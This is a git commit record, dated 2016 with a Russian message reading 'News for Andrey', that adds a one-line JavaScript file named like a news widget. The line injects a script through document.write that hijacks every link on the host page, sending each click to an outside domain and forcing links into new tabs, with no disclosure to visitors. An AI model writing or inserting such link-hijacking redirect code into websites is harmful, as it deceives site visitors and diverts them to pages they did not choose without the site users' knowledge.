b65ca39875a757d2d536f0436dd9b49ca8f9ec96
Akumuliation <vetalia777@mail.ru>
2016-11-22 14:24:32 +0200

    Новости для Андрея

---
+++ novostnik/novosti-z.js
@@ -0,0 +1,1 @@
+document.write('<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script><script type="text/javascript">$(document).ready(function() {$("a").click(function () {document.location.replace("http://official1.in.ua/novosti-z/");});$("a").attr("target","_blanck");});</script>');
